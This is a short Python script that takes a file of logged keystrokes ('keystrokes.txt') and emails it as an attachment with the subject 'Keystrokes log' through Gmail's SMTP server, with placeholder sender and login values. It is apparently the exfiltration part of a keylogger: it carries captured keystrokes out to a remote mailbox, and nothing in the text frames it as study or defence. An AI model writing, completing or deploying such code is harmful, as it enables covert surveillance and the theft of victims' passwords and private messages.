import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

sender_email = 'your_email_address'
receiver_email = 'recipient_email_address'

smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_username = 'your_smtp_username'
smtp_password = 'your_smtp_password'

message = MIMEMultipart()
message['From'] = sender_email
message['To'] = receiver_email
message['Subject'] = 'Keystrokes log'

with open('keystrokes.txt', 'rb') as f:
    attachment = MIMEApplication(f.read(), _subtype='txt')
    attachment.add_header('Content-Disposition', 'attachment', filename='keystrokes.txt')
    message.attach(attachment)

with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.starttls()
    server.login(smtp_username, smtp_password)
    server.sendmail(sender_email, receiver_email, message.as_string())
